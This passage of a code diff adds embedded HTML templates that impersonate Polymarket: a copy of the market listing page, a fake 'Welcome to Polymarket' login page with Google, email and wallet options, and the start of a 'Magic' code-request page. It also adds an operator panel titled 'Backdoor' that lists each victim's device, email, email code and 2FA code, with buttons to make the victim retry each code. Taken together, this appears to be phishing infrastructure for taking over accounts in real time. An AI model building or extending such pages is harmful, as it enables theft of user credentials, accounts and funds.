+                <div class="card-icon" style="background-image: url('https://i.ytimg.com/vi/J7x7Lp09nTo/maxresdefault.jpg'); background-position: center; background-size: cover;"></div>
+                Republican Presidential Nominee 2028
+            </div>
+            <div class="card-options">
+                <div class="option">
+                    <span class="option-label">J.D. Vance</span>
+                    <span class="option-percent">48%</span>
+                    <span class="yes-btn">Yes</span>
+                    <span class="no-btn">No</span>
+                </div>
+                <div class="option">
+                    <span class="option-label">Marco Rubio</span>
+                    <span class="option-percent">12%</span>
+                    <span class="yes-btn">Yes</span>
+                    <span class="no-btn">No</span>
+                </div>
+            </div>
+            <div class="volume">$280m Vol.</div>
+        </div>
+
+        <!-- Card 10: Democratic Presidential Nominee 2028 -->
+        <div class="card">
+            <div class="card-header">
+                <div class="card-icon" style="background-image: url('https://i.ytimg.com/vi/DOeYTLnjwc4/maxresdefault.jpg'); background-position: center; background-size: cover;"></div>
+                Democratic Presidential Nominee 2028
+            </div>
+            <div class="card-options">
+                <div class="option">
+                    <span class="option-label">Gavin Newsom</span>
+                    <span class="option-percent">27%</span>
+                    <span class="yes-btn">Yes</span>
+                    <span class="no-btn">No</span>
+                </div>
+                <div class="option">
+                    <span class="option-label">Alexandria Ocasio-Cortez</span>
+                    <span class="option-percent">10%</span>
+                    <span class="yes-btn">Yes</span>
+                    <span class="no-btn">No</span>
+                </div>
+            </div>
+            <div class="volume">$647m Vol.</div>
+        </div>
+
+        <!-- Card 11: Presidential Election Winner 2028 -->
+        <div class="card">
+            <div class="card-header">
+                <div class="card-icon" style="background-image: url('https://i.ytimg.com/vi/olnGw4kdV1k/maxresdefault.jpg'); background-position: center; background-size: cover;"></div>
+                Presidential Election Winner 2028
+            </div>
+            <div class="card-options">
+                <div class="option">
+                    <span class="option-label">JD Vance</span>
+                    <span class="option-percent">25%</span>
+                    <span class="yes-btn">Yes</span>
+                    <span class="no-btn">No</span>
+                </div>
+                <div class="option">
+                    <span class="option-label">Gavin Newsom</span>
+                    <span class="option-percent">19%</span>
+                    <span class="yes-btn">Yes</span>
+                    <span class="no-btn">No</span>
+                </div>
+            </div>
+            <div class="volume">$283m Vol.</div>
+        </div>
+
+        <!-- Card 12: Bitcoin above on February 12? -->
+        <div class="card">
+            <div class="card-header">
+                <div class="card-icon" style="background-image: url('https://i.ytimg.com/vi/C0juBzyyrlg/maxresdefault.jpg'); background-position: center; background-size: cover;"></div>
+                Bitcoin above _ on February 12?
+            </div>
+            <div class="card-options">
+                <div class="option">
+                    <span class="option-label">58,000</span>
+                    <span class="option-percent">100%</span>
+                    <span class="yes-btn">Yes</span>
+                    <span class="no-btn">No</span>
+                </div>
+                <div class="option">
+                    <span class="option-label">60,000</span>
+                    <span class="option-percent">100%</span>
+                    <span class="yes-btn">Yes</span>
+                    <span class="no-btn">No</span>
+                </div>
+            </div>
+            <div class="volume">$6m Vol. ~ Weekly</div>
+        </div>
+
+        <!-- Card 13: What price will Ethereum hit in February? -->
+        <div class="card">
+            <div class="card-header">
+                <div class="card-icon" style="background-image: url('https://i.ytimg.com/vi/m0xMVWn8D9I/maxresdefault.jpg'); background-position: center; background-size: cover;"></div>
+                What price will Ethereum hit in February?
+            </div>
+            <div class="card-options">
+                <div class="option">
+                    <span class="option-label">1,500</span>
+                    <span class="option-percent">&lt;1%</span>
+                    <span class="yes-btn">Yes</span>
+                    <span class="no-btn">No</span>
+                </div>
+                <div class="option">
+                    <span class="option-label">1,400</span>
+                    <span class="option-percent">&lt;1%</span>
+                    <span class="yes-btn">Yes</span>
+                    <span class="no-btn">No</span>
+                </div>
+            </div>
+            <div class="volume">$16m Vol. ~ Monthly</div>
+        </div>
+
+        <!-- Card 14: Elon Musk # tweets February 6 - February 13, 2026? -->
+        <div class="card">
+            <div class="card-header">
+                <div class="card-icon" style="background-image: url('https://i.ytimg.com/vi/_Ffv_Z_SqyE/maxresdefault.jpg'); background-position: center; background-size: cover;"></div>
+                Elon Musk # tweets February 6 - 13?
+            </div>
+            <div class="card-options">
+                <div class="option">
+                    <span class="option-label">340-359</span>
+                    <span class="option-percent">2%</span>
+                    <span class="yes-btn">Yes</span>
+                    <span class="no-btn">No</span>
+                </div>
+                <div class="option">
+                    <span class="option-label">360-379</span>
+                    <span class="option-percent">23%</span>
+                    <span class="yes-btn">Yes</span>
+                    <span class="no-btn">No</span>
+                </div>
+            </div>
+            <div class="volume">$14m Vol. ~ Weekly</div>
+        </div>
+
+        <!-- Card 15: Who will Trump nominate as Fed Chair? -->
+        <div class="card">
+            <div class="card-header">
+                <div class="card-icon" style="background-image: url('https://i.ytimg.com/vi/vGWr2TVsxCc/hqdefault.jpg'); background-position: center; background-size: cover;"></div>
+                Who will Trump nominate as Fed Chair?
+            </div>
+            <div class="card-options">
+                <div class="option">
+                    <span class="option-label">Kevin Warsh</span>
+                    <span class="option-percent">95%</span>
+                    <span class="yes-btn">Yes</span>
+                    <span class="no-btn">No</span>
+                </div>
+                <div class="option">
+                    <span class="option-label">Judy Shelton</span>
+                    <span class="option-percent">4%</span>
+                    <span class="yes-btn">Yes</span>
+                    <span class="no-btn">No</span>
+                </div>
+            </div>
+            <div class="volume">$461m Vol.</div>
+        </div>
+
+        <!-- Card 16: GTA VI released before June 2026? -->
+        <div class="card">
+            <div class="card-header">
+                <div class="card-icon" style="background-image: url('https://i.ytimg.com/vi/vR6LL8Xcs3U/maxresdefault.jpg'); background-position: center; background-size: cover;"></div>
+                GTA VI released before June 2026?
+            </div>
+            <div class="card-options">
+                <div class="option">
+                    <span class="option-percent">3% change</span>
+                    <span class="yes-btn">Yes</span>
+                    <span class="no-btn">No</span>
+                </div>
+            </div>
+            <div class="volume">$3m Vol.</div>
+        </div>
+
+        <!-- Card 17: Next Prime Minister of the Netherlands -->
+        <div class="card">
+            <div class="card-header">
+                <div class="card-icon" style="background-image: url('https://i.ytimg.com/vi/-AhUxxqIM9E/maxresdefault.jpg'); background-position: center; background-size: cover;"></div>
+                Next Prime Minister of the Netherlands
+            </div>
+            <div class="card-options">
+                <div class="option">
+                    <span class="option-label">Rob Jetten</span>
+                    <span class="option-percent">99%</span>
+                    <span class="yes-btn">Yes</span>
+                    <span class="no-btn">No</span>
+                </div>
+                <div class="option">
+                    <span class="option-label">Dilan Yeşilgöz-Zegerius</span>
+                    <span class="option-percent">&lt;1%</span>
+                    <span class="yes-btn">Yes</span>
+                    <span class="no-btn">No</span>
+                </div>
+            </div>
+            <div class="volume">$14m Vol.</div>
+        </div>
+
+        <!-- Card 18: Ethereum above on February 12? -->
+        <div class="card">
+            <div class="card-header">
+                <div class="card-icon" style="background-image: url('https://i.ytimg.com/vi/m0xMVWn8D9I/maxresdefault.jpg'); background-position: center; background-size: cover;"></div>
+                Ethereum above _ on February 12?
+            </div>
+            <div class="card-options">
+                <div class="option">
+                    <span class="option-label">1,500</span>
+                    <span class="option-percent">100%</span>
+                    <span class="yes-btn">Yes</span>
+                    <span class="no-btn">No</span>
+                </div>
+                <div class="option">
+                    <span class="option-label">1,600</span>
+                    <span class="option-percent">100%</span>
+                    <span class="yes-btn">Yes</span>
+                    <span class="no-btn">No</span>
+                </div>
+            </div>
+            <div class="volume">$2m Vol. ~ Weekly</div>
+        </div>
+
+        <!-- Card 19: Ukraine joins NATO before 2027? -->
+        <div class="card">
+            <div class="card-header">
+                <div class="card-icon" style="background-image: url('https://i.ytimg.com/vi/9wow8PvPo2M/maxresdefault.jpg'); background-position: center; background-size: cover;"></div>
+                Ukraine joins NATO before 2027?
+            </div>
+            <div class="card-options">
+                <div class="option">
+                    <span class="option-percent">6% change</span>
+                    <span class="yes-btn">Yes</span>
+                    <span class="no-btn">No</span>
+                </div>
+            </div>
+            <div class="volume">$1m Vol.</div>
+        </div>
+
+        <!-- Card 20: Bangladesh Parliamentary Election Winner -->
+        <div class="card">
+            <div class="card-header">
+                <div class="card-icon" style="background-image: url('https://i.ytimg.com/vi/_sL3Kd1zFBo/maxresdefault.jpg'); background-position: center; background-size: cover;"></div>
+                Bangladesh Parliamentary Election Winner
+            </div>
+            <div class="card-options">
+                <div class="option">
+                    <span class="option-label">Bangladesh Nationalists...</span>
+                    <span class="option-percent">97%</span>
+                    <span class="yes-btn">Yes</span>
+                    <span class="no-btn">No</span>
+                </div>
+                <div class="option">
+                    <span class="option-label">Bangladesh Jamaat-e...</span>
+                    <span class="option-percent">3%</span>
+                    <span class="yes-btn">Yes</span>
+                    <span class="no-btn">No</span>
+                </div>
+            </div>
+            <div class="volume">$3m Vol.</div>
+        </div>
+
+        <!-- Card 21: Next President of Vietnam -->
+        <div class="card">
+            <div class="card-header">
+                <div class="card-icon" style="background-image: url('https://i.ytimg.com/vi/igrOOspzv_E/maxresdefault.jpg'); background-position: center; background-size: cover;"></div>
+                Next President of Vietnam
+            </div>
+            <div class="card-options">
+                <div class="option">
+                    <span class="option-label">To Lam</span>
+                    <span class="option-percent">93%</span>
+                    <span class="yes-btn">Yes</span>
+                    <span class="no-btn">No</span>
+                </div>
+                <div class="option">
+                    <span class="option-label">Tran Thanh Man</span>
+                    <span class="option-percent">5%</span>
+                    <span class="yes-btn">Yes</span>
+                    <span class="no-btn">No</span>
+                </div>
+            </div>
+            <div class="volume">$6m Vol.</div>
+        </div>
+
+        <!-- Card 22: Will GTA 6 cost 100+? -->
+        <div class="card">
+            <div class="card-header">
+                <div class="card-icon" style="background-image: url('https://i.ytimg.com/vi/vR6LL8Xcs3U/maxresdefault.jpg'); background-position: center; background-size: cover;"></div>
+                Will GTA 6 cost 100+?
+            </div>
+            <div class="card-options">
+                <div class="option">
+                    <span class="option-percent">1% change</span>
+                    <span class="yes-btn">Yes</span>
+                    <span class="no-btn">No</span>
+                </div>
+            </div>
+            <div class="volume">$4m Vol. ~ Weekly</div>
+        </div>
+
+        <!-- Card 23: Prime Minister of Japan after snap election? -->
+        <div class="card">
+            <div class="card-header">
+                <div class="card-icon" style="background-image: url('https://i.ytimg.com/vi/I5z1qKCOuq0/maxresdefault.jpg'); background-position: center; background-size: cover;"></div>
+                Prime Minister of Japan?
+            </div>
+            <div class="card-options">
+                <div class="option">
+                    <span class="option-label">Sanae Takaichi</span>
+                    <span class="option-percent">100%</span>
+                    <span class="yes-btn">Yes</span>
+                    <span class="no-btn">No</span>
+                </div>
+                <div class="option">
+                    <span class="option-label">Hirofumi Yoshimura</span>
+                    <span class="option-percent">&lt;1%</span>
+                    <span class="yes-btn">Yes</span>
+                    <span class="no-btn">No</span>
+                </div>
+            </div>
+            <div class="volume">$8m Vol.</div>
+        </div>
+
+        <!-- Card 24: Bitcoin price on February 12? -->
+        <div class="card">
+            <div class="card-header">
+                <div class="card-icon" style="background-image: url('https://i.ytimg.com/vi/C0juBzyyrlg/maxresdefault.jpg'); background-position: center; background-size: cover;"></div>
+                Bitcoin price on February 12?
+            </div>
+            <div class="card-options">
+                <div class="option">
+                    <span class="option-label">-60,000</span>
+                    <span class="option-percent">&lt;1%</span>
+                    <span class="yes-btn">Yes</span>
+                    <span class="no-btn">No</span>
+                </div>
+                <div class="option">
+                    <span class="option-label">60,000-62,000</span>
+                    <span class="option-percent">&lt;1%</span>
+                    <span class="yes-btn">Yes</span>
+                    <span class="no-btn">No</span>
+                </div>
+            </div>
+            <div class="volume">$1m Vol. ~ Weekly</div>
+        </div>
+    </div>
+
+    <div class="show-more">Show more markets</div>
+
+    <div class="footer">
+        <div class="footer-logo">
+            <svg width="30" height="30" viewBox="0 0 250 300" preserveAspectRatio="xMidYMid meet" xmlns="http://www.w3.org/2000/svg" style="display:inline-block; vertical-align:middle;">
+                <g transform="translate(20.715, 10)">
+                    <polygon points="0,70 208.57,0 208.57,280 0,210" style="fill:black; stroke:black; stroke-width:2" />
+                    <polygon points="20,84.395 188.57,27.925 188.57,252.075 20,195.605" style="fill:white; stroke:none" />
+                    <polygon points="0,70 208.57,140 208.57,161.095 0,91.095" style="fill:black; stroke:none" />
+                    <polygon points="0,199.452 208.57,129.452 208.57,150.547 15.715,215.271" style="fill:black; stroke:none" />
+                    <line x1="0" y1="70" x2="208.57" y2="140" style="stroke:black; stroke-width:2" />
+                    <line x1="0" y1="199.452" x2="208.57" y2="129.452" style="stroke:black; stroke-width:2" />
+                    <line x1="20" y1="63.29" x2="20" y2="216.71" style="stroke:black; stroke-width:2" />
+                    <line x1="188.57" y1="6.71" x2="188.57" y2="273.29" style="stroke:black; stroke-width:2" />
+                    <line x1="0" y1="91.095" x2="208.57" y2="21.095" style="stroke:black; stroke-width:2" />
+                    <line x1="0" y1="188.905" x2="208.57" y2="258.905" style="stroke:black; stroke-width:2" />
+                    <line x1="0" y1="91.095" x2="208.57" y2="161.095" style="stroke:black; stroke-width:2" />
+                    <line x1="15.715" y1="215.271" x2="208.57" y2="150.547" style="stroke:black; stroke-width:2" />
+                </g>
+            </svg>
+            Polymarket
+        </div>
+        <div class="footer-tagline">The World's Largest Prediction Market™</div>
+        <div class="footer-sections">
+            <div class="section markets">
+                <h3>Markets by category</h3>
+                <div class="sub-columns">
+                    <div class="sub-column">
+                        <div>Climate & Science</div>
+                        <div>Predictions</div>
+                        <div>Earnings</div>
+                        <div>Predictions</div>
+                        <div>Financial</div>
+                        <div>Financial & predictions</div>
+                        <div>Political</div>
+                        <div>Odds & predictions</div>
+                        <div>World</div>
+                        <div>Trends & predictions</div>
+                    </div>
+                    <div class="sub-column">
+                        <div>Crypto</div>
+                        <div>Price predictions</div>
+                        <div>Economic</div>
+                        <div>Predictions & forecasts</div>
+                        <div>Geopolitical</div>
+                        <div>Predictions</div>
+                        <div>Sports</div>
+                        
+                        
+    <!-- NOTE: Original file content ended here in the user's provided input. -->
+</body>
+</html>
+    </script>
+
+    <!-- Original polymarket_welcome.html content (verbatim, preserved) -->
+    <script id="p2" type="text/plain">
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover, user-scalable=no">
+    <title>Welcome to Polymarket</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html, body {
+            width: 100%;
+            height: 100%;
+            max-height: 100vh;
+            overflow: hidden !important;
+            position: fixed;
+            top: 0;
+            left: 0;
+        }
+
+        body {
+            background-color: #f8f8f8;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            color: #1a1a1a;
+            padding: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 360px;
+            position: relative;
+            height: auto;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .close {
+            display: none;
+        }
+
+        .content {
+            text-align: center;
+            padding: 0;
+            margin: 0;
+        }
+
+        .logo-box {
+            background: linear-gradient(135deg, #1352F0 0%, #0D3DD4 100%);
+            width: 54px;
+            height: 54px;
+            border-radius: 14px;
+            margin: 0 auto 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-shrink: 0;
+        }
+
+        .logo-box svg {
+            width: 36px;
+            height: 36px;
+        }
+
+        h1 {
+            font-size: 20px;
+            font-weight: 500;
+            margin-bottom: 16px;
+            color: #1a1a1a;
+        }
+
+        .google-button {
+            background: linear-gradient(135deg, #1352F0 0%, #0D3DD4 100%);
+            color: white;
+            padding: 14px 16px;
+            border-radius: 10px;
+            font-size: 16px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 20px;
+            border: none;
+            font-weight: 500;
+            width: 100%;
+            touch-action: manipulation;
+        }
+
+        .google-icon {
+            font-size: 18px;
+            font-weight: bold;
+        }
+
+        .or-divider {
+            display: flex;
+            align-items: center;
+            color: #999;
+            margin: 16px 0;
+            font-size: 13px;
+        }
+
+        .or-divider::before,
+        .or-divider::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background-color: #e0e0e0;
+        }
+
+        .or-divider::before {
+            margin-right: 10px;
+        }
+
+        .or-divider::after {
+            margin-left: 10px;
+        }
+
+        .email-box {
+            background: white;
+            border: 1px solid #e0e0e0;
+            border-radius: 10px;
+            padding: 8px;
+            display: flex;
+            gap: 8px;
+            margin-bottom: 24px;
+        }
+
+        .email-input {
+            flex: 1;
+            padding: 12px 14px;
+            border: none;
+            font-size: 16px;
+            background: transparent;
+            outline: none;
+            color: #1a1a1a;
+            -webkit-appearance: none;
+            appearance: none;
+        }
+
+        .email-input::placeholder {
+            color: #999;
+        }
+
+        .continue-button {
+            background: linear-gradient(135deg, #5B8BF5 0%, #4A77E8 100%);
+            color: white;
+            padding: 12px 18px;
+            border: none;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            white-space: nowrap;
+            transition: background 0.3s ease;
+            touch-action: manipulation;
+        }
+
+        /* CHANGED: when active, switch to requested solid color (#1552F0) */
+        .continue-button.active {
+            background: #1552F0;
+        }
+
+        .wallet-icons {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 8px;
+            margin-bottom: 24px;
+        }
+
+        .wallet-icon {
+            border: 0.75px solid #e0e0e0;
+            border-radius: 8px;
+            background-color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+            height: 55px;
+            position: relative;
+            touch-action: manipulation;
+            overflow: hidden;
+        }
+
+        .inner-square {
+            width: 28px;
+            height: 28px;
+            background-color: #FFFFFF;
+            border: 1px solid #FFFFFF;
+            border-radius: 4px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+
+        .inner-square img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            object-position: center;
+        }
+
+        .inner-square.zoom-box3 {
+            background-color: #FFFFFF;
+        }
+
+        .inner-square.zoom-box3 img {
+            width: 350%;
+            height: 350%;
+            object-fit: cover;
+            object-position: center;
+        }
+
+        .inner-square.zoom-more img {
+            width: 190%;
+            height: 190%;
+            object-fit: cover;
+            object-position: center;
+        }
+
+        .terms {
+            color: #888;
+            font-size: 11px;
+            font-weight: 500;
+            margin-top: 12px;
+            letter-spacing: 0.3px;
+            margin-bottom: 0;
+        }
+
+        .terms a {
+            color: #888;
+            text-decoration: none;
+        }
+
+        /* Mobile version */
+        @media (max-width: 768px) {
+            html, body {
+                width: 100%;
+                height: 100%;
+                max-height: 100vh;
+                overflow: hidden !important;
+                position: fixed;
+                top: 0;
+                left: 0;
+            }
+
+            body {
+                padding: 0;
+            }
+
+            .content {
+                padding-top: 0;
+                padding: 0;
+            }
+
+            .logo-box {
+                margin: 0 auto 20px;
+            }
+
+            .email-input {
+                font-size: 16px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="content">
+            <div class="logo-box">
+                <svg width="36" height="36" viewBox="0 0 250 300" style="background-color: transparent;">
+                    <g transform="translate(20.715, 10)">
+                        <polygon points="0,70 208.57,0 208.57,280 0,210" style="fill:white; stroke:white; stroke-width:2" />
+                        <polygon points="20,84.395 188.57,27.925 188.57,252.075 20,195.605" style="fill:#1352F0; stroke:none" />
+                        <polygon points="0,70 208.57,140 208.57,161.095 0,91.095" style="fill:white; stroke:none" />
+                        <polygon points="0,199.452 208.57,129.452 208.57,150.547 15.715,215.271" style="fill:white; stroke:none" />
+                        <line x1="0" y1="70" x2="208.57" y2="140" style="stroke:white; stroke-width:2" />
+                        <line x1="0" y1="199.452" x2="208.57" y2="129.452" style="stroke:white; stroke-width:2" />
+                        <line x1="20" y1="63.29" x2="20" y2="216.71" style="stroke:white; stroke-width:2" />
+                        <line x1="188.57" y1="6.71" x2="188.57" y2="273.29" style="stroke:white; stroke-width:2" />
+                        <line x1="0" y1="91.095" x2="208.57" y2="21.095" style="stroke:white; stroke-width:2" />
+                        <line x1="0" y1="188.905" x2="208.57" y2="258.905" style="stroke:white; stroke-width:2" />
+                        <line x1="0" y1="91.095" x2="208.57" y2="161.095" style="stroke:white; stroke-width:2" />
+                        <line x1="15.715" y1="215.271" x2="208.57" y2="150.547" style="stroke:white; stroke-width:2" />
+                    </g>
+                </svg>
+            </div>
+
+            <h1>Welcome to Polymarket</h1>
+
+            <button class="google-button">
+                <span class="google-icon">G</span>
+                Continue with Google
+            </button>
+
+            <div class="or-divider">OR</div>
+
+            <div class="email-box">
+                <input type="email" class="email-input" placeholder="Email address" id="emailInput">
+                <button class="continue-button" id="continueBtn">Continue</button>
+            </div>
+
+            <div class="wallet-icons">
+                <div class="wallet-icon">
+                    <div class="inner-square">
+                        <img src="https://img.youtube.com/vi/jYsDbnzVxIw/hqdefault.jpg" alt="Box 1">
+                    </div>
+                </div>
+                <div class="wallet-icon">
+                    <div class="inner-square">
+                        <img src="https://img.youtube.com/vi/I5H2NR6HODE/hqdefault.jpg" alt="Box 2">
+                    </div>
+                </div>
+                <div class="wallet-icon">
+                    <div class="inner-square zoom-box3">
+                        <img src="https://img.youtube.com/vi/nJVsj1S4sYU/hqdefault.jpg" alt="Box 3">
+                    </div>
+                </div>
+                <div class="wallet-icon">
+                    <div class="inner-square zoom-more">
+                        <img src="https://img.youtube.com/vi/OFOBXrSrVDQ/hqdefault.jpg" alt="Box 4">
+                    </div>
+                </div>
+            </div>
+
+            <div class="terms">
+                <a href="#">Terms</a> • <a href="#">Privacy</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const emailInput = document.getElementById('emailInput');
+        const continueBtn = document.getElementById('continueBtn');
+
+        emailInput.addEventListener('input', function() {
+            if (this.value.includes('@')) {
+                continueBtn.classList.add('active');
+            } else {
+                continueBtn.classList.remove('active');
+            }
+        });
+
+        // Prevent all scrolling on desktop and mobile
+        document.addEventListener('wheel', function(e) {
+            e.preventDefault();
+        }, { passive: false });
+
+        document.addEventListener('touchmove', function(e) {
+            e.preventDefault();
+        }, { passive: false });
+
+        document.addEventListener('scroll', function(e) {
+            window.scrollTo(0, 0);
+        }, { passive: false });
+
+        // Prevent pinch zoom on mobile
+        document.addEventListener('gesturestart', function(e) {
+            e.preventDefault();
+        }, { passive: false });
+
+        // Lock scroll position
+        window.addEventListener('scroll', function() {
+            window.scrollTo(0, 0);
+        });
+    </script>
+</body>
+</html>
+    </script>
+
+    <!-- Original backdoor_welcome.html content (verbatim, preserved with requested visual modifications) -->
+    <script id="p3" type="text/plain">
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Backdoor</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            /* CHANGED BACKGROUND COLOR per request */
+            background-color: #0B305F;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .header {
+            font-size: 32px;
+            font-weight: 600;
+            color: #FFFFFF;
+            margin-bottom: 2cm;
+            letter-spacing: 1px;
+        }
+
+        .table-wrapper {
+            border-collapse: collapse;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+            border-radius: 4px;
+            overflow: hidden;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+
+        th {
+            background-color: #f8f9fa;
+            padding: 16px 12px;
+            text-align: center;
+            font-weight: 600;
+            color: #333333;
+            border-right: 1px solid #e0e0e0;
+            font-size: 14px;
+            letter-spacing: 0.5px;
+        }
+
+        th:last-child {
+            border-right: none;
+        }
+
+        /* Column width adjustments */
+        th:nth-child(1), td:nth-child(1) {
+            width: 5%;
+        }
+
+        th:nth-child(2), td:nth-child(2) {
+            width: 12%;
+        }
+
+        th:nth-child(3), td:nth-child(3) {
+            width: 24%;
+        }
+
+        th:nth-child(4), td:nth-child(4) {
+            width: 12%;
+        }
+
+        th:nth-child(5), td:nth-child(5) {
+            width: 12%;
+        }
+
+        th:nth-child(6), td:nth-child(6) {
+            width: 8%;
+        }
+
+        th:nth-child(7), td:nth-child(7) {
+            width: 8%;
+        }
+
+        tr {
+            border-top: 1px solid #e0e0e0;
+        }
+
+        tr:first-child {
+            border-top: 2px solid #333333;
+        }
+
+        td {
+            padding: 3px 10px; /* SLIMMED padding a bit */
+            text-align: center;
+            border-right: 1px solid #e0e0e0;
+            color: #666666;
+            font-size: 13px;
+            background-color: #ffffff;
+        }
+
+        td:last-child {
+            border-right: none;
+        }
+
+        tbody tr:hover {
+            background-color: #f5f5f5;
+            transition: background-color 0.2s ease;
+        }
+
+        tbody tr {
+            height: 32px; /* SLIMMED down from 40px per request */
+        }
+
+        .retry-box {
+            display: inline-block;
+            border: 1px solid #333333;
+            padding: 4px 8px;
+            border-radius: 3px;
+            font-size: 11px;
+            font-weight: 600;
+            color: #ffffff;
+            background-color: #8AA7FA;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            user-select: none;
+            -webkit-user-select: none;
+        }
+
+        .retry-box:hover {
+            background-color: #6f8ae0;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.15);
+        }
+
+        /* copy button inside cells */
+        .pm-copy-btn {
+            display: inline-block;
+            margin-left: 8px;
+            background: #0B305F;
+            color: #fff;
+            border-radius: 4px;
+            padding: 2px 6px;
+            font-size: 12px;
+            cursor: pointer;
+        }
+
+        /* copied toast */
+        .copy-toast {
+            position: fixed;
+            right: 16px;
+            bottom: 16px;
+            background: rgba(0,0,0,0.75);
+            color: #fff;
+            padding: 8px 12px;
+            border-radius: 6px;
+            font-size: 13px;
+            z-index: 9999;
+            opacity: 0;
+            transition: opacity 200ms ease;
+        }
+
+        .copy-toast.show {
+            opacity: 1;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">WELCOME</div>
+        
+        <table class="table-wrapper">
+            <thead>
+                <tr>
+                    <th>NC</th>
+                    <th>Device</th>
+                    <th>Email</th>
+                    <th>E-Code</th>
+                    <th>2fa Code</th>
+                    <th>Retry E-Code</th>
+                    <th>Retry 2fa</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td></td>
+                    <td></td>
+                    <td></td>
+                    <td></td>
+                    <td></td>
+                    <td><span class="retry-box">Retry</span></td>
+                    <td><span class="retry-box">Retry</span></td>
+                </tr>
+                <tr>
+                    <td></td>
+                    <td></td>
+                    <td></td>
+                    <td></td>
+                    <td></td>
+                    <td><span class="retry-box">Retry</span></td>
+                    <td><span class="retry-box">Retry</span></td>
+                </tr>
+                <tr>
+                    <td></td>
+                    <td></td>
+                    <td></td>
+                    <td></td>
+                    <td></td>
+                    <td><span class="retry-box">Retry</span></td>
+                    <td><span class="retry-box">Retry</span></td>
+                </tr>
+                <tr>
+                    <td></td>
+                    <td></td>
+                    <td></td>
+                    <td></td>
+                    <td></td>
+                    <td><span class="retry-box">Retry</span></td>
+                    <td><span class="retry-box">Retry</span></td>
+                </tr>
+                <tr>
+                    <td></td>
+                    <td></td>
+                    <td></td>
+                    <td></td>
+                    <td></td>
+                    <td><span class="retry-box">Retry</span></td>
+                    <td><span class="retry-box">Retry</span></td>
+                </tr>
+                <tr>
+                    <td></td>
+                    <td></td>
+                    <td></td>
+                    <td></td>
+                    <td></td>
+                    <td><span class="retry-box">Retry</span></td>
+                    <td><span class="retry-box">Retry</span></td>
+                </tr>
+                <tr>
+                    <td></td>
+                    <td></td>
+                    <td></td>
+                    <td></td>
+                    <td></td>
+                    <td><span class="retry-box">Retry</span></td>
+                    <td><span class="retry-box">Retry</span></td>
+                </tr>
+                <tr>
+                    <td></td>
+                    <td></td>
+                    <td></td>
+                    <td></td>
+                    <td></td>
+                    <td><span class="retry-box">Retry</span></td>
+                    <td><span class="retry-box">Retry</span></td>
+                </tr>
+                <tr>
+                    <td></td>
+                    <td></td>
+                    <td></td>
+                    <td></td>
+                    <td></td>
+                    <td><span class="retry-box">Retry</span></td>
+                    <td><span class="retry-box">Retry</span></td>
+                </tr>
+                <tr>
+                    <td></td>
+                    <td></td>
+                    <td></td>
+                    <td></td>
+                    <td></td>
+                    <td><span class="retry-box">Retry</span></td>
+                    <td><span class="retry-box">Retry</span></td>
+                </tr>
+                <tr>
+                    <td></td>
+                    <td></td>
+                    <td></td>
+                    <td></td>
+                    <td></td>
+                    <td><span class="retry-box">Retry</span></td>
+                    <td><span class="retry-box">Retry</span></td>
+                </tr>
+                <tr>
+                    <td></td>
+                    <td></td>
+                    <td></td>
+                    <td></td>
+                    <td></td>
+                    <td><span class="retry-box">Retry</span></td>
+                    <td><span class="retry-box">Retry</span></td>
+                </tr>
+                <tr>
+                    <td></td>
+                    <td></td>
+                    <td></td>
+                    <td></td>
+                    <td></td>
+                    <td><span class="retry-box">Retry</span></td>
+                    <td><span class="retry-box">Retry</span></td>
+                </tr>
+            </tbody>
+        </table>
+    </div>
+
+    <div id="pm-copy-toast" class="copy-toast" aria-hidden="true">Copied</div>
+</body>
+</html>
+    </script>
+
+    <!-- Original magic_request_code.html content (verbatim, preserved) -->
+    <script id="p4" type="text/plain">
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Magic</title>
+    <style>
+        body {
+            background-color: #FFFFFF;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        .top-bar {
+            width: 100%;
+            display: flex;
+            align-items: center;
+            padding: 10px 15px;
+            box-sizing: border-box;
+        }
+
+        .back-arrow {
+            font-size: 24px;
+            color: #000000;
+            cursor: pointer;
+        }
+
+        .title {
+            flex: 1;
+            text-align: center;
+            font-size: 20px;
+            font-weight: 500;
